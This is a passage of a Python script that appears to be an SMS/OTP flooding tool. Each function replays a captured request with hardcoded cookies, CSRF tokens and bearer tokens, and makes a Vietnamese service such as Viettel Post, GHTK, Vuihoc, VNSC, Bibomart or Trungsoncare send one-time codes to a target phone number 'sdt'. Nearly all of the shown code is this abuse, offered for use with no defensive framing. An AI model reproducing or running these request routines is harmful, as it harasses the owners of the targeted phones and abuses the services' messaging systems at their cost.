        'FormForgotPassword.OtpRequestToken': 'hQJjQ5MHm/+Xhhl4WE/bgqiz4zCSvnT05qKj6TdLzs8KoYZsamRBy8gm8QhpxICqva9jHMo6V25AHvcBwxd1XKKwAEtKLyQEf4MzKeDh0xcoyQ1uuOGDCU3BIZUVmpbS2xVvglOZJs4srUSPHb+JLY+l+plhFg3xKvRJBLWpX0SSiip2/oxddKFM4tXwC0QGY8JYhI6UUF/8lwVKqM12H+cd4/DB3SEwaXkix8HEy+RpAnPCNw7N1ZjmTGxwP6cHz8lr6sEIg+mMXiOB/neVMK8xib3SiJf5p7RyzPf7J+CYANyeiU9YGQ0TZJFfSRHm9IEyW6PmxB4+4nh9h5CGU6/7EAw4924l',
        'FormRegister.FullName': 'quoc tien huy',
        'FormRegister.UserName': '',
        'FormRegister.Email': '',
        'FormRegister.Phone': sdt,
        'FormRegister.ConfirmPhone': 'False',
        'FormRegister.ConfirmEmail': 'False',
        'FormRegister.RequiredPhone': 'False',
        'FormRegister.RequiredEmail': 'False',
        'FormRegister.Provider': '',
        'FormRegister.ProviderUserId': '',
        'FormRegister.Password': '123123aA',
        'FormRegister.ConfirmPassword': '123123aA',
        'FormRegister.IsRegisterFromPhone': 'True',
        'FormRegister.UserId': '',
        'FormMergeModel.JsonListEmailConflict': '',
        'FormMergeModel.JsonListPhoneConflict': '',
        'FormMergeModel.EmailSelected': '',
        'FormMergeModel.PhoneSelected': '',
        'FormMergeModel.PhoneVerify': '',
        'FormMergeModel.EmailVerify': '',
        'FormMergeModel.IsRequiredSelect': 'False',
        'FormMergeModel.Password': '',
        'FormMergeModel.Provider': '',
        'FormMergeModel.ProviderUserId': '',
        'FormMergeModel.IsEmailVerified': 'False',
        'FormMergeModel.IsPhoneVerified': 'False',
        'FormNotMergeModel.Password': '',
        'FormNotMergeModel.Provider': '',
        'FormNotMergeModel.ProviderUserId': '',
        'FormNotMergeModel.UserSSOId': '',
        'FormNotMergeModel.EmailSelected': '',
        'FormNotMergeModel.PhoneSelected': '',
        'FormNotMergeModel.NotMergePhoneVerify': '',
        'FormNotMergeModel.NotMergeEmailVerify': '',
        'FormNotMergeModel.IsEmailVerified': 'False',
        'FormNotMergeModel.IsPhoneVerified': 'False',
        'FormLoginOTP.Username': '',
        'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=2fm315xzemzryzwbsz8jfj',
        'ConfirmOtpType': 'Register',
        'UserClientId': '',
        'ClientId': '',
        'OTPCode1': '',
        'OTPCode2': '',
        'OTPCode3': '',
        'OTPCode4': '',
        'OTPCode5': '',
        'OTPCode6': '',
        '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv-9JDAZiojDWGeKRvEUJqdyE128lDNBqZyxK9-1bDuTNAgW17qbK9uBU6V-VwQFZywRBM06-A6m7VU2ACjP9_OVf1RWEqp2aTwboyIFSzmLAXCbIuwwASKM6jHPCb2IAJ0',
    }

    try:
        response = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIETTELPOST | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIETTELPOST | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ghtk():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'apptype': 'Web',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MzM1MDIzNSwidGVsIjoiMDM1NzE1NjMyMiIsImVtYWlsIjoiNjZiMzNmYTRmMjNjNEBnaHRrLmlvIiwiYWNjZXNzX3Rva2VuIjpudWxsLCJqd3QiOm51bGwsImludmFsaWRfYXQiOnsiZGF0ZSI6IjIwMjQtMDgtMTQgMTY6MzQ6MjguOTk1NjkwIiwidGltZXpvbmVfdHlwZSI6MywidGltZXpvbmUiOiJBc2lhXC9Ib19DaGlfTWluaCJ9fQ.nr08Xjl1uhmrMZAaDu3BBO5PPhyBnroiTD9SOrw1hgc',
        'content-type': 'application/json',
        'origin': 'https://khachhang.giaohangtietkiem.vn',
        'priority': 'u=1, i',
        'referer': 'https://khachhang.giaohangtietkiem.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'shop-code': '',
        'uniqdevice': '0b59bf2e-65f0-489a-9ecd-9619d146001f',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'name': 'GTC Shop',
        'tel': sdt,
        'password': '123123aA@',
        'confirm_password': '123123aA@',
        'first_address': '12 BC TIn',
        'province': 'An Giang',
        'province_id': '833',
        'district': 'Huyện Châu Phú',
        'district_id': '1470',
        'ward': 'Xã Bình Long',
        'ward_id': '16579',
        'hamlet': 'Ấp Bình Chiến',
        'hamlet_id': '114065',
    }

    response = requests.post(
        'https://web.giaohangtietkiem.vn/api/v1/register-shop/create-register-shop',
        headers=headers,
        json=json_data,
    )

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'apptype': 'Web',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MzM1MDIzNywidGVsIjoiMDM1NzE1NjMyMSIsImVtYWlsIjoiNjZiMzNmYzVjOGI2MkBnaHRrLmlvIiwiYWNjZXNzX3Rva2VuIjpudWxsLCJqd3QiOm51bGwsImludmFsaWRfYXQiOnsiZGF0ZSI6IjIwMjQtMDgtMTQgMTY6MzU6MDEuODI2MDUwIiwidGltZXpvbmVfdHlwZSI6MywidGltZXpvbmUiOiJBc2lhXC9Ib19DaGlfTWluaCJ9fQ.th7fjWe_Z1_Aag1RQlDwQ_Q82k1cUkVrghVeJWIHqGI',
        'content-type': 'application/json',
        'origin': 'https://khachhang.giaohangtietkiem.vn',
        'priority': 'u=1, i',
        'referer': 'https://khachhang.giaohangtietkiem.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'shop-code': '',
        'uniqdevice': '0b59bf2e-65f0-489a-9ecd-9619d146001f',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'username': sdt,
        'card_images': [
            {
                'url': 'https://cache.giaohangtietkiem.vn/d/e569e3e6683d23d7de857156622c3703.png',
                'image_order': 1,
            },
            {
                'url': 'https://cache.giaohangtietkiem.vn/d/e8bd8e58171021dcb1bcac57487acf2e.png',
                'image_order': 2,
            },
        ],
    }

    try:
        response = requests.post('https://web.giaohangtietkiem.vn/api/v1/shop/password/send-otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GHTK | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GHTK | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vuihoc():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'ja',
        'app-id': '3',
        'authorization': 'Bearer',
        'content-type': 'application/json',
        'origin': 'https://vuihoc.vn',
        'priority': 'u=1, i',
        'referer': 'https://vuihoc.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'send-from': 'WEB',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'mobile': sdt,
    }

    try:
        response = requests.post('https://api.vuihoc.vn/api/send-otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VUIHOC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VUIHOC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vnsc():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://invest.vnsc.vn',
        'priority': 'u=1, i',
        'referer': 'https://invest.vnsc.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'type': 'PHONE_VERIFICATION_OTP',
        'phone': sdt,
        'email': '',
    }

    try:
        response = requests.post('https://api.vinasecurities.com/auth/v1/otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VNSC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VNSC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def bibomart():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://bibomart.com.vn',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': sdt,
        'type': 1,
    }

    try:
        response = requests.post('https://prod.bibomart.net/customer_account/v2/otp/send', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BIBOMART | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BIBOMART | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def zl188():
    cookies = {
        '_require_login': '17',
        'XSRF-TOKEN': 'eyJpdiI6Imc3SlRHcXJlc0xEb0NHeWZtMjYyNGc9PSIsInZhbHVlIjoibDgrUzMwMEc5b0hqelQ2eFlpMDdseEhrVFlYMHZJcTdZVXVNelR3S0JudDAxTW9OTVBSYWdoeCtmTk5pTHNDM01JVDBzdHA0dVFBWTRnd0FpMzJTUnc9PSIsIm1hYyI6Ijk0MmRkOGZiNDk0ZTNjZGQzMDY3MGI3MjQ5ZWRiYmRlOGE0NGI5MDY4N2NmM2JiNmE3NGIzMTRlYmM5MzRhNGIifQ%3D%3D',
        'laravel_session': 'eyJpdiI6Im5acjNXaUZlb3V3MklSWmZGWjJralE9PSIsInZhbHVlIjoidGlGalVnSUN3aG9rVklKTUlhOWc4Z3ZubUJNdGROdmNhUDZnTE1GVTFsa3ZTTVhcL3U5THVKUTZPVFZZdUlDYlFlK3d6Mnh3RlU0aHBIcGtHNk9mbTBBPT0iLCJtYWMiOiI0MmZlZGNlYmU2ZGRhYTdjOWNkYTM2ODM1ZTkwNmM1M2M5MTJmNTBiNjZjODJkODQwNzdjZTMzYTJkOTdlN2NiIn0%3D',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_require_login=17; XSRF-TOKEN=eyJpdiI6Imc3SlRHcXJlc0xEb0NHeWZtMjYyNGc9PSIsInZhbHVlIjoibDgrUzMwMEc5b0hqelQ2eFlpMDdseEhrVFlYMHZJcTdZVXVNelR3S0JudDAxTW9OTVBSYWdoeCtmTk5pTHNDM01JVDBzdHA0dVFBWTRnd0FpMzJTUnc9PSIsIm1hYyI6Ijk0MmRkOGZiNDk0ZTNjZGQzMDY3MGI3MjQ5ZWRiYmRlOGE0NGI5MDY4N2NmM2JiNmE3NGIzMTRlYmM5MzRhNGIifQ%3D%3D; laravel_session=eyJpdiI6Im5acjNXaUZlb3V3MklSWmZGWjJralE9PSIsInZhbHVlIjoidGlGalVnSUN3aG9rVklKTUlhOWc4Z3ZubUJNdGROdmNhUDZnTE1GVTFsa3ZTTVhcL3U5THVKUTZPVFZZdUlDYlFlK3d6Mnh3RlU0aHBIcGtHNk9mbTBBPT0iLCJtYWMiOiI0MmZlZGNlYmU2ZGRhYTdjOWNkYTM2ODM1ZTkwNmM1M2M5MTJmNTBiNjZjODJkODQwNzdjZTMzYTJkOTdlN2NiIn0%3D',
        'origin': 'https://188.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://188.com.vn/dang-ky?urlreturn=https://188.com.vn',
        'sec-ch-ua': '"Opera";v="116", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0',
        'x-csrf-token': '4KMnfF7jTrg7VbhqFm7eKxGv46otphQokZi5CeGV',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        'otp_type': '1',
    }

    try:
        response = requests.post('https://188.com.vn/get-token-auth-phone', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()
        print("188.COM.VN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("188.COM.VN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def goldenspoonszl():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://goldenspoons.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://goldenspoons.com.vn/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
        'type': 1,
        'language': 1,
        'provider': 2,
    }

    try:
        response = requests.post('https://backend2.tgss.vn/2e55ad4eb9ad4631b65efe18710b6feb/otp/send', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GOLDENSPOONSZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GOLDENSPOONSZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def goldenspoonszlresend():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://goldenspoons.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://goldenspoons.com.vn/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
        'type': 1,
        'language': 1,
        'provider': None,
    }

    try:
        response = requests.post('https://backend2.tgss.vn/2e55ad4eb9ad4631b65efe18710b6feb/otp/resend', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GOLDENSPOONSZLRESEND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GOLDENSPOONSZLRESEND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def goldenspoonssms():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://goldenspoons.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://goldenspoons.com.vn/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
        'type': 1,
        'language': 1,
        'provider': 1,
    }

    try:
        response = requests.post('https://backend2.tgss.vn/2e55ad4eb9ad4631b65efe18710b6feb/otp/send', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GOLDENSPOONSSMS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GOLDENSPOONSSMS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def goldenspoonssmsresend():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://goldenspoons.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://goldenspoons.com.vn/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
        'type': 1,
        'language': 1,
        'provider': 1,
    }

    try:
        response = requests.post('https://backend2.tgss.vn/2e55ad4eb9ad4631b65efe18710b6feb/otp/resend', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GOLDENSPOONSSMSRESEND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GOLDENSPOONSSMSRESEND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def hoangphuc():
    cookies = {
        'mage-banners-cache-storage': '{}',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'form_key': 'JTtX1a62gBu8U3UN',
        'mage-messages': '',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'PHPSESSID': 'd998f60e640fa72f86057c8958fb40ba',
        'mage-cache-sessid': 'true',
        'private_content_version': '0eab2366670393b2207e706a65ed9b4b',
        'section_data_ids': '{%22messages%22:null}',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'mage-banners-cache-storage={}; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; form_key=JTtX1a62gBu8U3UN; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; PHPSESSID=d998f60e640fa72f86057c8958fb40ba; mage-cache-sessid=true; private_content_version=0eab2366670393b2207e706a65ed9b4b; section_data_ids={%22messages%22:null}',
        'origin': 'https://hoangphuconline.vn',
        'priority': 'u=1, i',
        'referer': 'https://hoangphuconline.vn/customer/account/create/',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'x-newrelic-id': 'UAcAUlZSARABVFlaBQYEVlUD',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action_type': '1',
        'tel': sdt,
        'form_key': 'JTtX1a62gBu8U3UN',
    }

    response = requests.post('https://hoangphuconline.vn/advancedlogin/otp/CheckValii/', cookies=cookies, headers=headers, data=data)
    print(response.text)


def trungsoncarezl(): # cook ip
    cookies = {
        'popNewLogin': '0',
        'sid_customer_s_558c5': '2c6597c4decf004b58a4b188d65efafd-1-C',
        'checkacc': '0',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'popNewLogin=0; sid_customer_s_558c5=2c6597c4decf004b58a4b188d65efafd-1-C; checkacc=0',
        'Origin': 'https://trungsoncare.com',
        'Referer': 'https://trungsoncare.com/auth-loginform/?return_url=index.php%3Fdispatch%3Dorders.search',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'dispatch': 'loginbyOTP',
    }

    data = {
        'func': 'getotp',
        'user_type': 'zalo',
        'read_policy': '1',
        'ip_code': '84',
        'user_login': sdt,
        'security_hash': '2e95aca90d025bc949785961ba432043',
    }

    try:
        response = requests.post('https://trungsoncare.com/index.php', params=params, cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TRUNGSONCAREZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TRUNGSONCAREZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def trungsoncaresms():
    cookies = {
        'popNewLogin': '0',
        'sid_customer_s_558c5': '2c6597c4decf004b58a4b188d65efafd-1-C',
        'checkacc': '0',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'popNewLogin=0; sid_customer_s_558c5=2c6597c4decf004b58a4b188d65efafd-1-C; checkacc=0',
        'Origin': 'https://trungsoncare.com',
        'Referer': 'https://trungsoncare.com/auth-loginform/?return_url=index.php%3Fdispatch%3Dprofiles.update',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'dispatch': 'loginbyOTP',
    }

    data = {
        'func': 'getotp',
        'user_type': 'sms',
        'read_policy': '1',
        'ip_code': '84',
        'user_login': sdt,
        'security_hash': '2e95aca90d025bc949785961ba432043',
    }

    try:
        response = requests.post('https://trungsoncare.com/index.php', params=params, cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TRUNGSONCARESMS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TRUNGSONCARESMS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def kkfashion():
    cookies = {
        'jpresta_cache_context': 'e67fa49f-162d-11ee-9cf4-0692000019e5',
        '_qg_fts': '1721578581',
        'QGUserId': '1896938940101377',
        '_qg_pushrequest': 'true',
        '_qg_cm': '1',
        'PrestaShop-7cbf831598fa6791cd6d07d5b5873d26': 'def502007b8c8eb61736105deec2c85b445e6b2b827b1c9881ead4a1ec5871091282a04d8ff5014f99895733add04bfa3275048c602279d788847264d33d990cebe62d9a15000217ffdd531574e2cdc2848c276e0739404447439d8ce193208fe23a7ec6d710571ea52c1105a2d4d7ee79614b41e1b48de782c3410d1f20ac399f7a0922ff7e5643597bb8cde4bee8dc764d41bec75afe39a9c71c942627ed995e9f5bddc231678f21cf69365f0cf548bc67a888ef420102a0b233c45ed78b2d262d36518dc78b61f6eff594c9e2af4b11e3f25edd',
        'PHPSESSID': 'd6e6f38ea2j2tf3m264h26599v',
        'PrestaShop-03bfe1c20f5691800e1f882876466fe7': 'def50200a1276f3d7b88be6bf9b7363cc6a59f6ba6b1453cb3b46c0633940c04a97756272df36d87542e8a27e57038d4b7936ffed9c1e753d9ee9a30effd837ab2846cf4d3a67fd12c07b04e5aa5c8aaf0be9f8aeecf4c685c42eb85987277010284ddcad86163c8ee6cb7ff98c89909d3de555a7f7fdc5bdbdd9c31bd8882e2dcb962799979fdab88a49b719d3cdaef4617f0c7c735099ae76dd72c8afaa66ce54698d12810f5d9cae8add5a54fc79cab7aaa016f23fb78ac404c03a9ce81a78abaa2cf793ff38929e312c6182028b27dc77105c3c0d5022c5ba4674d25b3a11982034a8080d39601ad371dd8ec95fab4e776f1688c25428aee70f107ce7693a30156b6993e7a777e528a68c86c822cc375ccfa629cf58990ed',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'jpresta_cache_context=e67fa49f-162d-11ee-9cf4-0692000019e5; _qg_fts=1721578581; QGUserId=1896938940101377; _qg_pushrequest=true; _qg_cm=1; PrestaShop-7cbf831598fa6791cd6d07d5b5873d26=def502007b8c8eb61736105deec2c85b445e6b2b827b1c9881ead4a1ec5871091282a04d8ff5014f99895733add04bfa3275048c602279d788847264d33d990cebe62d9a15000217ffdd531574e2cdc2848c276e0739404447439d8ce193208fe23a7ec6d710571ea52c1105a2d4d7ee79614b41e1b48de782c3410d1f20ac399f7a0922ff7e5643597bb8cde4bee8dc764d41bec75afe39a9c71c942627ed995e9f5bddc231678f21cf69365f0cf548bc67a888ef420102a0b233c45ed78b2d262d36518dc78b61f6eff594c9e2af4b11e3f25edd; PHPSESSID=d6e6f38ea2j2tf3m264h26599v; 